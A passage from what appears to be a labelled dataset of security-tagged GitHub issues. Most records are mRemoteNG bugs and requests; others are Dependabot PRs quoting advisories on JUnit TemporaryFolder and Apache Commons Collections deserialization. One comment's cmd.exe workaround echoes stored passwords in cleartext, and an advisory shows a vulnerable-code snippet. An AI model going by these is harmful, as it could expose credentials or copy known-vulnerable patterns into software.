    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Management/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Management.dll
----------------------------------------
ObjectListView
    Assembly Version: 2.9.1.1072
    Win32 Version: 2.9.1.0
    CodeBase: file:///C:/Program%20Files%20(x86)/mRemoteNG/ObjectListView.DLL
----------------------------------------
System.Web
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3282.0 built by: NET472REL1LAST_B
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_32/System.Web/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Web.dll
----------------------------------------
System.Data
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3260.0 built by: NET472REL1LAST_C
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_32/System.Data/v4.0_4.0.0.0__b77a5c561934e089/System.Data.dll
----------------------------------------
System.Transactions
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3221.0 built by: NET472REL1LAST_C
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_32/System.Transactions/v4.0_4.0.0.0__b77a5c561934e089/System.Transactions.dll
----------------------------------------
System.EnterpriseServices
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0 built by: NET472REL1
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_32/System.EnterpriseServices/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.EnterpriseServices.dll
----------------------------------------
System.Runtime.Caching
    Assembly Version: 4.0.0.0
    Win32 Version: 4.7.3056.0
    CodeBase: file:///C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Runtime.Caching/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Runtime.Caching.dll
----------------------------------------

************** JIT Debugging **************
To enable just-in-time (JIT) debugging, the .config file for this
application or computer (machine.config) must have the
jitDebugging value set in the system.windows.forms section.
The application must also be compiled with debugging
enabled.

For example:

<configuration>
    <system.windows.forms jitDebugging=""true"" />
</configuration>

When JIT debugging is enabled, any unhandled exception
will be sent to the JIT debugger registered on the computer
rather than be handled by this dialog box.","I have the same issue with v1.76.13 prerelease.",no,"Bug,Security,DBs,"
mRemoteNG/mRemoteNG,1302773491,"the application crashes at startup, a failed module C:\WINDOWS\System32\KERNELBASE.dll","1. there was an attempt to reinstall (repair)
2. the application with the new user profile starts normally
3. tried to replace confCons.xml from conf files Conf.xml .{date}.backup without changes
4. I moved the %appdata%\mRemoteNG directory to a new profile, at startup I need a password that I don't understand where to get, apparently, the password for encrypting the data file
## CrashDumps
[mRemoteNG.exe.32124.zip](https://github.com/mRemoteNG/mRemoteNG/files/9097935/mRemoteNG.exe.32124.zip)
## System events
1. ![image](https://user-images.githubusercontent.com/28947729/178625324-5cf0b899-965d-4bc6-b3d5-a0e91c4d0f8b.png)
2. ![image](https://user-images.githubusercontent.com/28947729/178625376-33a18016-4d05-477e-88a8-55c562a59cf4.png)
3. ![image](https://user-images.githubusercontent.com/28947729/178625417-2a5dee7c-d3f2-42c4-9fb3-5b2d7ad16080.png)


","found a corrupted file
%localappdata%\mRemoteNG\....\user.config
![image](https://user-images.githubusercontent.com/28947729/178628608-933fdce9-9945-4e69-9d96-4d9cd7d3807d.png)

![image](https://user-images.githubusercontent.com/28947729/178629180-c5624267-3e54-470f-9fc0-6fd392fe6423.png)
tell me that a password is needed for the file confCons.xml
where to get it, and why, when creating a new database, there is no information that in which case you will lose all your data and the password for recovery will be missingthat a bit different way working as you may expect, on first run its will ask you if you want to encode and then do that asking password if you don't remember password you have no way how to open that file for decrypting, and agree something is not working right there and its in todo list to have a look next (1.77.4 =>)",no,"Bug,Security,"
mRemoteNG/mRemoteNG,364948076,"Settings RDP loadbalanceinfo causes An internal error has occured","## Issue
As soon as I set anything in the loadbalanceinfo of a RDP session, I get a Message: 4 An internal error has occured.

## Expected Behavior
To connect to my RDS server farm and provide the loadbalanceinfo

## Your Environment
* Windows 10 Pro 1803 x64 17134.319
mRemoteNG version 1.75.7012.16814
","Do you get the error message when trying to connect to the server or when setting the loadbalanceinfo property in mRemoteNG?

Is your server hosted in Azure, by any chance? If so, this might be related to #829 or #523.Error is when connecting.

Server is on our LAN.

#829 is the pull request to include this functionnality. It could be an error handling this, I don't know.

#523 There isn't enough details about the error. It might be related. I did a network capture, and I saw a TLS1.2 packet before encryption which contains loadbalancinginfo with the RDS pool name. Not the cookie hash mentionned.Does the value in your loadbalanceinfo section follow the rules mentioned in the ""remarks"" section here? https://docs.microsoft.com/en-us/windows/desktop/TermServ/imsrdpclientadvancedsettings-loadbalanceinfo#remarksNo, it does not use the Cookie syntax. The configured value is : 
tsv://MS Terminal Services Plugin.1.RDS-XXXXX\r\n

With native Windows Remote Desktop, I see this field provided in the first TLS packet sent (after TCP/IP handshake). 
0000   00 1c 7f 85 6e 1a 9c b6 d0 ff e0 bb 08 00 45 00   ....n..¶Ðÿà»..E.
0010   00 6b 3c 42 40 00 80 06 2e e5 c0 a8 8c 0a c0 a8   .k<B@....åÀ¨..À¨
0020   82 0a d4 95 0d 3d ce 34 4e 86 75 bd 13 f4 50 18   ..Ô..=Î4N.u½.ôP.
0030   01 00 cb d4 00 00 03 00 00 43 3e e0 00 00 00 00   ..ËÔ.....C>à....
0040   00 74 73 76 3a 2f 2f 4d 53 20 54 65 72 6d 69 6e   .**tsv://MS Termin**
0050   61 6c 20 53 65 72 76 69 63 65 73 20 50 6c 75 67   **al Services Plug**
0060   69 6e 2e 31 2e 52 44 53 2d 58 58 58 58 58 58 0d   **in.1.RDS-XXXXXX.**
0070   0a 01 00 08 00 0b 00 00 00                        .........

With mRemoteNG I see an extra 0x00 between every char provided. Then the server RST the connection.

0000   00 1c 7f 85 6e 1a 9c b6 d0 ff e0 bb 08 00 45 00   ....n..¶Ðÿà»..E.
0010   00 97 42 f1 40 00 80 06 28 0a c0 a8 8c 0a c0 a8   ..Bñ@...(.À¨..À¨
0020   82 0a d5 92 0d 3d 80 fa 6f a4 e7 8c b0 d2 50 18   ..Õ..=.úo¤ç.°ÒP.
0030   01 00 35 8b 00 00 03 00 00 6f 6a e0 00 00 00 00   ..5......ojà....
0040   00 74 00 73 00 76 00 3a 00 2f 00 2f 00 4d 00 53   .t.s.v.:././.M.S
0050   00 20 00 54 00 65 00 72 00 6d 00 69 00 6e 00 61   . .T.e.r.m.i.n.a
0060   00 6c 00 20 00 53 00 65 00 72 00 76 00 69 00 63   .l. .S.e.r.v.i.c
0070   00 65 00 73 00 20 00 50 00 6c 00 75 00 67 00 69   .e.s. .P.l.u.g.i
0080   00 6e 00 2e 00 31 00 2e 00 52 00 44 00 53 00 2d   .n...1...R.D.S.-
0090   **00** 58 **00** 58 **00** 58 **00** 58 00 58 00 58 00 01 00 08   .G.S.-.M.T.L....
00a0   00 0b 00 00 00                                    .....
Hmm that is interesting. The original reason for #829 was that .NET uses UTF-16 encoded strings by default, but Azure was expecting UTF-8 encoded. It seems like that may be what is happening here as well.

Would you be able to try the most recent v1.76 version (you can grab the portable version if you don't want to upgrade fully yet)? Turn on the following setting and see if the connection works: `Tools -> Options -> Advanced -> Use UTF8 encoding for RDP 'Load Balance Info' property`Works with 1.76.3 Alpha 5 (2018-03-14). I had another issue. Seems like, after the TLS connection is established, the RD server redirects to another server, which works seemlessly with RDP, but don't with mRemoteNG. However, going directly to that host works for me.

Thanks,

![image](https://user-images.githubusercontent.com/50488/46413141-52e42680-c6ee-11e8-8343-b0a279d3b385.png)
Maybe same here.. trying to connect to our RDS farm with ""loadbalanceinfo"" many times with different options/mremoteng versions, but was too lazy to create issue :(

Now it's 1.76.8, ""tsv://MS Terminal Services Plugin.1.1cdev"" or ""tsv://MS Terminal Services Plugin.1.1cdev\r\n"" in loadbalaceinfo.

Without ""UTF8"" checked it's error that says cannot connect ot gateway, with ""UTF8"" checked it's just closes connection in 1-5 sec after ""Connecting"" without any errors.

And if I use .rdp file with all this options in it all works fine without mremoteng :(

Sorry for my poor english ;)@xlash You can try setting the `Use Console Session` property for that connection to `True` (or right click the session -> Connect with options -> Connect to console session). Beyond that I'm not entirely sure what could be causing that error.

@Shooshka does the mRemoteNG.log file show why the session was disconnected? https://github.com/mRemoteNG/mRemoteNG/wiki/Troubleshooting-and-Logging@sparerd Thanks!@xlash Is it working for you now?> @Shooshka does the mRemoteNG.log file show why the session was disconnected? https://github.com/mRemoteNG/mRemoteNG/wiki/Troubleshooting-and-Logging

@sparerd 

UTF8 checked, tsv://MS Terminal Services Plugin.1.1cdev\r\n in loadbalanceinfo:

Smth like: ""Your computer cannot connect to the remote desktop, because broker/gw can't verify parameters of RDP file.""

So I think problem in ""signature:s:"" section that persists in .rdp file but missing in mRemoteNG.No, got session denied (visually by RDS host). Investigating the delta.I see the TLS negotiation successfull, I'm able to authenticate using Windows  (NTLM?), but then, it silently closes without notification. In the network capture, I see a TCP reset send by mRemoteNG to the host.@sparerd Any updates/news on connections with ""signature""?Hello.
Could you confirm if mRemoteNG will be able to manage ""signature"" in next releases ?
Thanks.Got only once connect by mRemoteNG with loadbalanceinfo in version 1.77.
But it was only once.
Cannot reproduce this now and it's sad.Same issue here I'm afraid.  Exactly as the others said.  Tried latest nightly build and it errors whether or not the UTF8 option is ticked.",no,"RDP,Security,Improvement required,Windows,"
mRemoteNG/mRemoteNG,342369845,"Import connections CSV instead of XML","Would like to move connections back to mRemoteNG from RoyalTS but Royal will only export to CSV.  It'll take forever to try and replicate connections from one to the other.  Thoughts?",,no,"Enhancement,1.77.2,Needs implementation,Security,Connections,Import/Export,"
mRemoteNG/mRemoteNG,306969645,"Display password","Hi,

I decided to open this issue to request a new feature :

**Feature Request**
User will be able to display clearly the password field when he fill it to be able to check if his password is set correctly  like in windows or google with an eye for example

Thank you very much

Best regards
","hi. this would be nice. Workaround: create an external app with the following command:
file name: cmd.exe
Parameter: echo %username%@%hostname%:%port% ^| password is^: %password%

a sample where i used integrated ConEmu for this:
![grafik](https://user-images.githubusercontent.com/5631071/37867563-e5f324a8-2f9a-11e8-8ca0-a1409e2de5a6.png)
@vmario89 Thank you for the workaround ^^

And yes it would be a very nice feature 😃 ",no,"UI/UX,Feature Request,Security,"
mRemoteNG/mRemoteNG,522048634,"exclamation mark not working in passwords","<!--- Provide a general summary of the issue in the Title above -->
Exclamation mark in passwords not working. 

## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->

## Current Behavior
<!--- If describing a bug, tell us what happens instead of the expected behavior -->
All saved connections with an exclamation mark in the password will be aborted with a connection error. Whether external VPN or RDP connection. After manually entering the password in the RDP connection, the session is established. This could be tested with multiple connections to different servers.
<!--- If suggesting a change/improvement, explain the difference from current behavior -->

## Possible Solution
<!--- Not obligatory, but suggest a fix/reason for the bug, -->
<!--- or ideas how to implement the addition or change -->

## Steps to Reproduce (for bugs)
<!--- Provide an unambiguous set of steps to reproduce -->
<!--- this bug. Include code to reproduce, if relevant -->
1. use an account where the password has an exclamation mark.
2. save the credentials in the connection
3. try to start the connection
4. VPN client or RDP client reports an incorrect user name or password.

## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->
* Version used:
* Operating System and version (e.g. Windows 10 1709 x64):
","I have same Problem.
With the externaltool which i can see the password in clear shows the following behavier:
`My_super_secret_password^!`

i tried with Copy - Paste and tiping out the password. both same behavier of storing the password with the `^`Already discussed in #1651 and #1664 
Use an exclamation mark in the variable name (`%!password%` or `%!username%`) to prevent metacharacter escaping and argument splitting.",no,"Need 2 check,Security,"
mRemoteNG/mRemoteNG,987797314,"create cache wen connected to db","if you connect to db there are no way to open in local without connection.
is necessary that if connected to db and no connetion to it the data must be opened in read only with cache.
","in coming version it will be a bit different. We should have profile, that accept inputs from several sources. Some sources can be read only, some writable. So play scenario in yours case. You have empty profile. You make a connection to db, and ask to import connection data. You will be asked if you wish to store that data locally or not (in advance you may select store passwords or not) that will be encrypted and stored locally, or it will be flashed out once you close session (or application) (option: destroy on disconnection, on close) so once you rerun it - its will be give you a choice use that is stored, or refresh from db. Please keep in mind that a lot of request comes from corp users to be able auto auto update passwords, so even if you store connection details locally, it may not work if passwords has been changed and you need to connect to db again to refresh it. But to be able to connect to db you also will need a correct credentials :)   ok...i'm waiting for new version and using nightly 1.77.2-nb but not want to work with mysql...i've created the mysql db as here 
https://github.com/mRemoteNG/Documentation/blob/master/docs/mysql_db_setup.sql but software have this error 
----------
ErrorMsg
09/08/2021 15:44:52
Couldn't save connections file as """"!
Missing the DataColumn 'ICAEncryptionStrength' for the SourceColumn 'ICAEncryptionStrength'.
----------

",no,"Enhancement,Fenix,Security,DBs,"
mRemoteNG/mRemoteNG,258477659,"Implement  SecureString Class to decrypt sensitve data on use","Reference #482 

Use the [SecureString Class](https://msdn.microsoft.com/en-us/library/system.security.securestring(v=vs.110).aspx) to decrypt on USE (before needing the password for a connection or ext tool for example). This would keep the password encrypted in memory at all times.","Pushing this back to v1.77",no,"High Priority,Ready,Security Vuln,"
matthewmccullough/encryption-jvm-bootcamp,719370148,"[Security] Bump junit from 4.12 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 4.12 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.12...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.12&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=4.12&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-269g-pwp5-87pp).*

> **TemporaryFolder on unix-like systems does not limit access to created files**
> ### Vulnerability
> 
> The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.
> 
> Example of vulnerable code:
> ```java
> public static class HasTempFolder {
>     @Rule
>     public TemporaryFolder folder = new TemporaryFolder();
> 
> ... (truncated)

> 
> Affected versions: [""< 4.13.1""]

",yes,"dependencies,security,"
matthewmccullough/encryption-jvm-bootcamp,525795757,"[Security] Bump commons-collections from 2.1.1 to 3.2.2","Bumps commons-collections from 2.1.1 to 3.2.2.

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=commons-collections:commons-collections&package-manager=maven&previous-version=2.1.1&new-version=3.2.2)](https://dependabot.com/compatibility-score.html?dependency-name=commons-collections:commons-collections&package-manager=maven&previous-version=2.1.1&new-version=3.2.2)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-6hgm-866r-3cjv).*

> **Insecure Deserialization in Apache Commons Collection**
> Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.
> 
> Affected versions: [""< 3.2.2""]

",yes,"dependencies,security,"
LevelFourAB/dust,719070251,"[Security] Bump junit from 4.9 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 4.9 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.9...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.9&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=4.9&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-269g-pwp5-87pp).*

> **TemporaryFolder on unix-like systems does not limit access to created files**
> ### Vulnerability
> 
> The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.
> 
> Example of vulnerable code:
> ```java
> public static class HasTempFolder {
>     @Rule
>     public TemporaryFolder folder = new TemporaryFolder();
> 
> ... (truncated)

> 
> Affected versions: [""< 4.13.1""]

",yes,"dependencies,security,"
processone/ejabberd,187442514,"OCSP Stapling","It would be nice if ejabberd would support OCSP Stapling. Nowadays there is even a [way to force this stapling](https://blog.mozilla.org/security/2015/11/23/improving-revocation-ocsp-must-staple-and-short-lived-certificates/) via special certificates, but for this to work you should support OCSP Stapling.
